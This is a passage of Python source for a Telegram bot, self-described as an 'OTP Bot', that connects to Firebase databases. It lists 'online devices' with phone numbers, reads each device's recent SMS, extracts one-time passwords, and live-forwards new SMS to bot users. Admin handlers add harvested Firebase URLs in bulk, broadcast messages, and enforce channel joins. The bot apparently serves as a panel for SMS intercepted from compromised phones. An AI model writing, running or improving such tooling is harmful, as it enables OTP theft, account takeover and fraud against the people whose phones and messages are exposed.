                    parse_mode="HTML",
                    reply_markup=connect_inline_kb())
            except Exception as e:
                logger.error(f"idle-stop notify: {e}")
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.error("[SMS MONITOR] crashed uid=%s err=%r", uid, e, exc_info=True)
    finally:
        current_state = sms_monitor_state.get(uid)
        if current_state is state:
            sms_monitor_state.pop(uid, None)
            sms_monitor_tasks.pop(uid, None)


def start_sms_monitor(bot, uid: int, chat_id: int, device_id: str,
                       unlimited: bool = False, baseline_fingerprints=None,
                       fb_url: str = ""):
    stop_sms_monitor(uid)
    task_token = object()
    now = time.monotonic()
    state = {
        "device_id": device_id, "chat_id": chat_id,
        "sent_message_ids": [], "bot": bot, "unlimited": unlimited,
        "baseline_fingerprints": set(baseline_fingerprints or ()),
        "fb_url": fb_url, "task_token": task_token,
        "last_activity": now,
    }
    sms_monitor_state[uid] = state
    task = asyncio.create_task(_sms_monitor_loop(
        bot, uid, chat_id, device_id, unlimited=unlimited,
        baseline_fingerprints=baseline_fingerprints,
        fb_url=fb_url, task_token=task_token, state=state))
    sms_monitor_tasks[uid] = task
    logger.info("[SMS MONITOR] started uid=%s device=%s interval=%.1fs suppress=%s",
                uid, device_id, SMS_MONITOR_INTERVAL, not bool(baseline_fingerprints))


def _parse_prefixed(device_id: str):
    if "|" in device_id:
        parts = device_id.split("|", 1)
        return parts[0], parts[1]
    return "", device_id


def _find_fb_url_by_tag(uid: int, tag: str) -> Optional[str]:
    for url, t in global_fb_list:
        if t == tag:
            return url
    sess = user_sessions.get(uid)
    if sess:
        for url, t in sess.get("fb_list", []):
            if t == tag:
                return url
    return None


# ============================================================
# ADMIN CALLBACKS
# ============================================================
def _admin_only(uid: int) -> bool:
    return uid in ADMIN_IDS


async def _admin_show_firebases(q):
    text = _build_admin_fb_text()
    await q.edit_message_text(text, parse_mode="Markdown",
                              reply_markup=admin_firebases_kb())
    await _start_admin_panel_live_task(
        q.bot, q.from_user.id, q.message.chat_id, q.message.message_id)


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list, maintenance_mode, _last_refresh_time
    q = update.callback_query
    uid = q.from_user.id
    if not _admin_only(uid):
        await q.answer("Admin only.", show_alert=True)
        return
    await q.answer()
    data = q.data

    if not (data == "admin_manage_fb"
            or data.startswith("admin_fb_refresh:")
            or data.startswith("admin_fb_info:")
            or data.startswith("admin_fb_delete:")):
        _stop_admin_panel_live_task(uid)

    # ⚡ MANUAL FIREBASE REFRESH (Sirf Admin)
    if data == "admin_manual_refresh":
        try:
            await q.edit_message_text(
                "🔍 *Checking all Firebases...*\n\n"
                "⏳ Please wait 5-15 seconds...",
                parse_mode="Markdown")
        except Exception:
            pass

        start_time = time.time()
        try:
            await refresh_global_device_cache()
            elapsed = round(time.time() - start_time, 2)
            _last_refresh_time = time.monotonic()

            cache = global_device_cache
            online = cache.get("online_count", 0)
            offline = cache.get("offline_count", 0)
            per_fb = cache.get("per_fb", {}) or {}
            updated = cache.get("updated_at", "")

            lines = [
                "✅ *FIREBASE CHECK COMPLETE*",
                "",
                f"⏱️ Time: `{elapsed}s`",
                f"🕒 Updated: `{updated}`",
                "",
                f"📊 *TOTALS*",
                f"🟢 Online: `{online}`",
                f"🔴 Offline: `{offline}`",
                f"📱 Total: `{online + offline}`",
                "",
                "*PER FIREBASE:*",
            ]
            if per_fb:
                for tag, counts in per_fb.items():
                    o = int(counts.get("online", 0))
                    f = int(counts.get("offline", 0))
                    lines.append(f"• *{tag}* → 🟢 {o} | 🔴 {f} | 📊 {o+f}")
            else:
                lines.append("_No Firebase added yet._")

            await q.edit_message_text(
                "\n".join(lines),
                parse_mode="Markdown",
                reply_markup=admin_panel_kb())
        except Exception as e:
            logger.error("manual refresh failed: %s", e)
            await q.edit_message_text(
                f"❌ *Refresh Failed*\n\n`{str(e)[:200]}`",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb())
        return

    if data == "admin_toggle_maintenance":
        maintenance_mode = not maintenance_mode
        _save_maintenance_mode()
        notice = (_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️")
                  if maintenance_mode
                  else _bold_blockquote("✅ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗙𝗙"))
        sent = failed = 0
        for target_uid in list(known_users):
            try:
                await context.bot.send_message(chat_id=target_uid,
                                                text=notice, parse_mode="HTML")
                sent += 1
            except Exception as exc:
                failed += 1
                logger.info("maintenance notice failed for %s: %s", target_uid, exc)
        await q.edit_message_text(
            f"{notice}\n\n📨 Sent: {sent}\n❌ Failed: {failed}",
            parse_mode="HTML", reply_markup=admin_panel_kb())
        return

    if data == "admin_back":
        context.user_data.pop("admin_action", None)
        await q.edit_message_text(
            "🛠 *Admin Panel*\n\nSelect an action:",
            parse_mode="Markdown", reply_markup=admin_panel_kb())
        return

    if data == "admin_stats":
        await q.edit_message_text(
            "📊 *Bot Statistics*\n\n"
            f"👥 Total users: `{len(known_users)}`\n"
            f"🔗 Firebases: `{len(global_fb_list)}`\n"
            f"📢 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
            f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
            f"⚡ SMS poll: `{SMS_MONITOR_INTERVAL}s`\n"
            f"🌐 Flask: `{FLASK_HOST}:{FLASK_PORT}`\n"
            f"🎁 Mode: `FREE + Manual Refresh`",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_add_firebase":
        if len(global_fb_list) >= MAX_FIREBASES:
            await q.answer(f"Max {MAX_FIREBASES} Firebase allowed.", show_alert=True)
            return
        context.user_data["admin_action"] = "add_firebase"
        await q.edit_message_text(
            "➕ *BULK ADD FIREBASE*\n\n"
            "Ek ya MULTIPLE Firebase URL bhejo — aas-paas ka text auto ignore hoga.\n\n"
            "*Example:*\n`https://xxx-default-rtdb.firebaseio.com`",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_manage_fb":
        await _admin_show_firebases(q)
        return

    if data.startswith("admin_fb_refresh:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            url, tag = global_fb_list[idx]
            await q.edit_message_text(f"⏳ Refreshing `{tag}`...")
            await refresh_global_device_cache()
            _last_refresh_time = time.monotonic()
            text = _build_admin_fb_text()
            await q.edit_message_text(text, parse_mode="Markdown",
                                      reply_markup=admin_firebases_kb())
            await _start_admin_panel_live_task(
                context.bot, uid, q.message.chat_id, q.message.message_id)
        except Exception as e:
            logger.error("admin_fb_refresh: %s", e)
            await q.edit_message_text("❌ Refresh failed.",
                                      reply_markup=admin_firebases_kb())
        return

    if data.startswith("admin_fb_delete:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            removed = global_fb_list.pop(idx)
            _retag_global_firebases()
            _save_global_firebases()
            await q.edit_message_text(
                f"🗑 *Deleted*\n\nRemoved: `{removed[1]}`\n"
                f"Remaining: {len(global_fb_list)}/{MAX_FIREBASES}",
                parse_mode="Markdown", reply_markup=admin_firebases_kb())
        except Exception as e:
            logger.error("admin_fb_delete: %s", e)
            await q.answer("Delete failed.", show_alert=True)
        return

    if data.startswith("admin_fb_info:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            url, tag = global_fb_list[idx]
            per_fb = global_device_cache.get("per_fb", {}) or {}
            counts = per_fb.get(tag) or {}
            online = int(counts.get("online", 0))
            offline = int(counts.get("offline", 0))
            await q.edit_message_text(
                f"📋 *{tag}*\n\n"
                f"🟢 Online: `{online}`\n🔴 Offline: `{offline}`\n"
                f"📊 Total: `{online + offline}`\n"
                f"🕒 `{global_device_cache.get('updated_at', '')}`",
                parse_mode="Markdown", reply_markup=admin_firebases_kb())
        except Exception as e:
            logger.error("admin_fb_info: %s", e)
            await q.answer("Load failed.", show_alert=True)
        return

    if data == "admin_broadcast":
        context.user_data["admin_action"] = "broadcast"
        await q.edit_message_text(
            "📢 *Broadcast*\n\nBroadcast message bhejein.",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_add_channel":
        context.user_data["admin_action"] = "add_channel"
        await q.edit_message_text(
            "➕ *Add Force-Join Channel*\n\n"
            "Format bhejein:\n\n"
            "• `@channelusername`\n"
            "• `https://t.me/channelusername`\n"
            "• `-1001234567890` (private)\n\n"
            "⚠️ *Bot ko us channel ka admin banana zaroori hai.*",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_channels":
        if REQUIRED_CHANNELS:
            lines = ["📋 *Force-Join Channels*\n"]
            for i, channel in enumerate(REQUIRED_CHANNELS, 1):
                lines.append(f"*{i}.* `{channel.get('label', channel.get('id'))}`")
                lines.append(f"     🆔 `{channel.get('id')}`")
                lines.append(f"     🔗 {channel.get('url', '')}")
                lines.append("")
            text = "\n".join(lines)
        else:
            text = ("📋 *Force-Join Channels*\n\n"
                    "❌ Abhi koi channel add nahi hai.\n\n"
                    "➡️ *ADD JOIN CHANNEL* se add karo.")
        await q.edit_message_text(text, parse_mode="Markdown",
                                  reply_markup=admin_channels_kb())
        return

    if data.startswith("admin_remove_channel:"):
        try:
            index = int(data.split(":", 1)[1])
            if index < 0 or index >= len(REQUIRED_CHANNELS):
                await q.answer("Invalid channel.", show_alert=True)
                return
            removed = REQUIRED_CHANNELS.pop(index)
            _save_required_channels()
            _user_join_cache.clear()
            await q.edit_message_text(
                f"✅ *Channel Removed*\n\n"
                f"📢 `{removed.get('label', removed.get('id'))}`\n\n"
                f"📊 Remaining: `{len(REQUIRED_CHANNELS)}`",
                parse_mode="Markdown", reply_markup=admin_channels_kb())
        except (ValueError, IndexError):
            await q.answer("Invalid channel.", show_alert=True)
        return


# ============================================================
# SMS VIEW
# ============================================================
async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str] = None):
    fb_url = info.get("fb_url", "")
    real_cid = info.get("real_cid", device_id)
    tag = info.get("fb_tag", "?")

    if not fb_url:
        parsed_tag, parsed_cid = _parse_prefixed(device_id)
        fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if not fb_url:
            await _safe_edit_callback_message(
                q, "❌ *Device info missing.*\n\nPlease tap REFRESH.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
                    [InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number")],
                ]))
            return
        real_cid = parsed_cid
        tag = parsed_tag

    try:
        await _safe_edit_callback_message(q, "⏳ Fetching SMS...")
    except Exception:
        pass

    pairs = await fetch_last_sms(fb_url, real_cid, limit=FB_MESSAGES_LIMIT)

    if not pairs:
        await _safe_edit_callback_message(
            q,
            f"📭 *No SMS records found.*\n\n"
            f"🌐 Firebase: `{tag}`\n📱 Device: `{real_cid}`",
            parse_mode="Markdown", reply_markup=sms_view_kb(device_id))
        return

    lines = [f"📩 LAST {len(pairs)} SMS", "",
             "━━━━━━━━━━━━━━━━━━━━━━━",
             f"🌐 Firebase: {tag}",
             f"📱 Device: {real_cid}",
             "━━━━━━━━━━━━━━━━━━━━━━━"]
    circled_numbers = ("①", "②", "③", "④", "⑤")
    for i, (ts_key, m) in enumerate(pairs, 1):
        sender = _extract_msg_sender(m)
        body = _extract_msg_body(m)
        when = _extract_msg_time(m, ts_key)
        otp = _extract_otp(body)
        if not body:
            body = "(no body)"
        number_label = circled_numbers[i - 1] if i <= len(circled_numbers) else f"{i}."
        if i > 1:
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━")
        lines.extend(["",
                      f"{number_label} ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ: {sender}",
                      f"⏱️ ᴛɪᴍᴇ: {when}",
                      "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️",
                      f"{_otp_short_message(sender, body)}"])
        if otp:
            lines.append(f"🔑 ᴏᴛᴘ: `{otp}`")
    if updated_at:
        lines.extend(["", "━━━━━━━━━━━━━━━━━━━━━━━", "𝗨𝗽𝗱𝗮𝘁𝗲𝗱",
                      "━━━━━━━━━━━━━━━━━━━━━━━"])
    text = "\n".join(lines)
    if len(text) > 3800:
        text = text[:3800] + "\n\n... (truncated)"

    await _safe_edit_callback_message(
        q, text, parse_mode="Markdown",
        reply_markup=sms_view_kb(device_id))


# ============================================================
# MENU CALLBACK
# ============================================================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "force_verify":
        await force_verify_callback(update, context)
        return

    if not await _require_access(update, context, edit_target=q.message):
        return

    uid = q.from_user.id
    touch_sms_monitor(uid)

    data = q.data
    sess = user_sessions.get(uid)

    if not sess:
        await q.edit_message_text(
            "⚠️ Session expired.\n\nSend /start again.",
            reply_markup=connect_inline_kb())
        return

    if data == "manage_firebase":
        await q.edit_message_text(
            f"🔗 *Manage Firebase*\n\n"
            f"Connected: {len(sess.get('fb_list', []))}/{MAX_FIREBASES}\n"
            f"Choose an action:",
            parse_mode="Markdown", reply_markup=manage_fb_kb(uid))
        return

    if data == "menu_back":
        stop_sms_monitor(uid)
        if not sess.get("fb_list"):
            await q.edit_message_text("Hii 👋\n\nWelcome to Firebase Connector",
                                      reply_markup=connect_inline_kb())
            return
        await q.edit_message_text(
            f"🔗 *Connected Firebase*\n\n"
            f"📊 Total: {len(sess['fb_list'])}/{MAX_FIREBASES}\n\n"
            "Tap a Firebase to fetch online devices.",
            parse_mode="Markdown", reply_markup=manage_fb_kb(uid))
        return

    if data == "scan_active":
        stop_sms_monitor(uid)
        await q.edit_message_text("⏳ Scanning online devices...")
        await scan_and_show(update, context, edit_target=q.message)
        return

    if data == "device_list":
        uid = q.from_user.id
        touch_sms_monitor(uid)
        current_device = sess.get("current_device")
        if current_device:
            await _show_device_view(q, sess, current_device)
        else:
            if not sess.get("devices"):
                await q.answer("Refreshing...", show_alert=False)
                await scan_and_show(update, context, edit_target=q.message)
                return
            await _show_cached_device_list(q, sess)
        return

    if data.startswith("scan_fb:"):
        stop_sms_monitor(uid)
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(sess.get("fb_list", [])):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            await q.edit_message_text("⏳ Scanning this Firebase...")
            await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
        except Exception as e:
            logger.error(f"scan firebase: {e}")
            await q.edit_message_text("❌ Scan failed.")
        return

    if data.startswith("delete_fb:"):
        try:
            idx = int(data.split(":", 1)[1])
            fb_list = sess.get("fb_list", [])
            if idx < 0 or idx >= len(fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            removed = fb_list.pop(idx)
            fb_list = [(url, f"FB{i+1}") for i, (url, _) in enumerate(fb_list)]
            sess["fb_list"] = fb_list
            sess["devices"] = {}
            stop_sms_monitor(uid)
            await q.edit_message_text(
                f"🗑️ *Firebase Deleted*\n\n"
                f"Removed: `{removed[1]}`\n"
                f"Remaining: {len(fb_list)}/{MAX_FIREBASES}",
                parse_mode="Markdown",
                reply_markup=manage_fb_kb(uid) if fb_list else connect_inline_kb())
        except Exception as e:
            logger.error(f"delete firebase: {e}")
            await q.edit_message_text("❌ Delete failed.")
        return

    if data.startswith("fbnoop:"):
        try:
            idx = int(data.split(":", 1)[1])
            fb_list = sess.get("fb_list", [])
            if 0 <= idx < len(fb_list):
                await q.answer(f"Opening {fb_list[idx][1]}...")
                await q.edit_message_text(f"⏳ Scanning {fb_list[idx][1]}...")
                await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
            else:
                await q.answer("Invalid Firebase.", show_alert=True)
        except Exception as e:
            logger.error(f"open firebase: {e}")
            await q.answer("Firebase scan failed.", show_alert=True)
        return

    if data == "noop":
        await q.answer(f"Page {sess.get('device_page', 0)+1}")
        return

    if data.startswith("devpage:"):
        try:
            page = int(data.split(":", 1)[1])
            devices = sess.get("devices", {})
            items = list(devices.items())[:80]
            total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
            if page < 0 or page >= total_pages:
                await q.answer("Invalid page.", show_alert=True)
                return
            sess["device_page"] = page
            await _show_cached_device_list(q, sess)
        except Exception as e:
            logger.error(f"device page: {e}")
            await q.answer("Page change failed.", show_alert=True)
        return

    if data.startswith("dev:"):
        device_id = data.split(":", 1)[1]
        await _show_device_view(q, sess, device_id)
        return

    if data.startswith("sms_refresh:") or data.startswith("sms:"):
        device_id = data.split(":", 1)[1]
        info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id)
            fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url:
                info = {
                    "fb_url": fb_url, "fb_tag": parsed_tag,
                    "real_cid": parsed_cid, "phone": "",
                    "online": True, "raw": {},
                }
                sess.setdefault("devices", {})[device_id] = info
            else:
                await q.answer("Device not found. Please REFRESH.", show_alert=True)
                return
        if data.startswith("sms_refresh:"):
            sess.setdefault("sms_last_updated", {})[device_id] = datetime.now().strftime("%I:%M %p")
        updated_at = sess.get("sms_last_updated", {}).get(device_id)
        await _show_sms_safe(q, info, device_id, updated_at=updated_at)
        return

    if data.startswith("smsmon_stop:"):
        stop_sms_monitor(uid)
        device_id = data.split(':', 1)[1]
        await _show_device_view(q, sess, device_id)
        return

    if data.startswith("smsmon:"):
        device_id = data.split(":", 1)[1]
        info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id)
            fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url:
                info = {
                    "fb_url": fb_url, "fb_tag": parsed_tag,
                    "real_cid": parsed_cid, "phone": "",
                    "online": True, "raw": {},
                }
                sess.setdefault("devices", {})[device_id] = info
            else:
                await q.answer("Device not found.", show_alert=True)
                return
        phone = info.get("phone") or "N/A"
        stop_sms_monitor(uid)
        start_sms_monitor(
            context.bot, uid, q.message.chat_id, device_id,
            baseline_fingerprints=set(),
            fb_url=info.get("fb_url", ""))
        await q.edit_message_text(
            "📨 *SMS Monitor Started*\n\n"
            f"📱 *Device:* `{info.get('real_cid', device_id)}`\n"
            f"📞 *Number:* `{phone}`\n\n"
            "⚡ *Speed:* Fast polling\n\n"
            "🔔 Naya SMS turant yahan forward hoga.",
            parse_mode="Markdown", reply_markup=sms_monitor_kb(device_id))
        state = sms_monitor_state.get(uid)
        if state is not None:
            state["monitor_message_id"] = q.message.message_id
        return


# ============================================================
# SCAN HELPER
# ============================================================
async def scan_and_show(update, context, edit_target=None, fb_idx=None):
    uid = update.effective_user.id
    sess = user_sessions.get(uid)
    if not sess or not sess.get("fb_list"):
        if edit_target:
            await edit_target.edit_text("⚠️ No Firebase connected. Send /start.")
        return
    if fb_idx is not None:
        sess["active_fb_idx"] = fb_idx
    prefetched = sess.pop("prefetched", {})
    devices_task = fetch_devices_all_firebases(
        sess["fb_list"], only_online=True, prefetched=prefetched)
    counts_task = fetch_counts_all_firebases(
        sess["fb_list"], prefetched=prefetched)
    devices, (online_count, offline_count, per_fb) = await asyncio.gather(
        devices_task, counts_task)
    online_count = len(devices)
    total_count = online_count + offline_count
    sess["devices"] = devices
    sess["device_page"] = 0
    sess["online_count"] = online_count
    sess["offline_count"] = offline_count
    sess["total_count"] = total_count
    text = (f"📞 *DEVICES INFO*\n\n"
            f"🟢 ONLINE : {online_count}\n"
            f"🔴 OFFLINE : {offline_count}\n"
            f"📊 TOTAL : {total_count}\n"
            f"🔗 Firebase: {len(sess['fb_list'])}\n\n"
            "Tap a device below.")
    markup = (device_list_kb(devices, page=0)
              if devices else firebase_connected_kb(uid))
    if edit_target:
        await edit_target.edit_text(text, parse_mode="Markdown", reply_markup=markup)
    else:
        await update.effective_message.reply_text(
            text, parse_mode="Markdown", reply_markup=markup)


# ============================================================
# MAINTENANCE LOOP (cleanup only)
# ============================================================
async def _maintenance_loop(bot):
    while True:
        try:
            await asyncio.sleep(CLEANUP_INTERVAL)
            gc.collect()
            for uid, task in list(sms_monitor_tasks.items()):
                if task.done():
                    sms_monitor_tasks.pop(uid, None)
            for uid, task in list(admin_panel_live_tasks.items()):
                if task.done():
                    admin_panel_live_tasks.pop(uid, None)
            # Cleanup expired join cache
            now = time.time()
            for uid, (_, ts) in list(_user_join_cache.items()):
                if now - ts > JOIN_CACHE_TTL * 2:
                    _user_join_cache.pop(uid, None)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error(f"maintenance: {e}")


# ============================================================
# SHUTDOWN
# ============================================================
async def _post_stop(app):
    for task in list(sms_monitor_tasks.values()):
        if not task.done():
            task.cancel()
    if sms_monitor_tasks:
        await asyncio.gather(*sms_monitor_tasks.values(), return_exceptions=True)
    sms_monitor_tasks.clear()
    sms_monitor_state.clear()
    for task in list(admin_panel_live_tasks.values()):
        if not task.done():
            task.cancel()
    if admin_panel_live_tasks:
        await asyncio.gather(*admin_panel_live_tasks.values(), return_exceptions=True)
    admin_panel_live_tasks.clear()
    await close_http_session()
    logger.info("Monitor loops cancelled + HTTP session closed.")


async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    logger.error(
        "telegram handler error update=%s: %s",
        type(update).__name__, error,
        exc_info=(type(error), error, error.__traceback__) if error else None)


# ============================================================
# MAIN
# ============================================================
def main():
    global bot_instance
    print("=" * 60)
    print("  🔥 Firebase Connector — OTP Bot FREE Edition")
    print(f"  Max Firebases: {MAX_FIREBASES}")
    print(f"  Global FBs: {len(global_fb_list)}")
    print(f"  Force-join channels: {len(REQUIRED_CHANNELS)}")
    print(f"  Mode: 🎁 FREE (No Refer / No Credits / No Captcha)")
    print(f"  Auto device refresh: ❌ DISABLED (sirf admin manual)")
    print(f"  SMS poll interval: {SMS_MONITOR_INTERVAL}s (⚡ fast OTP)")
    print(f"  First-cycle suppress: ✅ (purane SMS skip)")
    print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
    print("=" * 60)

    start_flask_thread()

    app = Application.builder().token(BOT_TOKEN).build()
    bot_instance = app.bot

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CallbackQueryHandler(
        admin_callback,
        pattern=r"^admin_(back|stats|add_firebase|manage_fb|broadcast|toggle_maintenance|add_channel|channels|manual_refresh|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+)$"))
    app.add_handler(CallbackQueryHandler(generate_number_callback,
                                          pattern="^generate_number$"))
    app.add_handler(CallbackQueryHandler(
        menu_callback,
        pattern=r"^(device_list|menu_back|dev:.+|sms_refresh:.+|sms:.+|smsmon:.+|smsmon_stop:.+|force_verify|scan_active|scan_fb:\d+|delete_fb:\d+|fbnoop:\d+|noop|devpage:\d+|manage_firebase)$"))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE,
        text_router))
    app.add_error_handler(_telegram_error_handler)

    async def _post_init(application):
        global bot_instance, BOT_USERNAME
        bot_instance = application.bot
        try:
            me = await application.bot.get_me()
            BOT_USERNAME = me.username or "YourBot"
            logger.info("Bot username cached: @%s", BOT_USERNAME)
        except Exception as exc:
            logger.warning("could not cache bot username: %s", exc)
            BOT_USERNAME = "YourBot"
        await get_http_session()
        logger.info("⚡ Global HTTP session ready")
        application.bot_data["maintenance_task"] = asyncio.create_task(
            _maintenance_loop(application.bot))
        # 📌 Auto device refresh hata diya — sirf admin manual button se refresh hoga

    async def _post_stop_with_cleanup(application):
        task = application.bot_data.pop("maintenance_task", None)
        if task and not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)
        await _post_stop(application)

    app.post_init = _post_init
    app.post_shutdown = _post_stop_with_cleanup
    print("🚀 Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
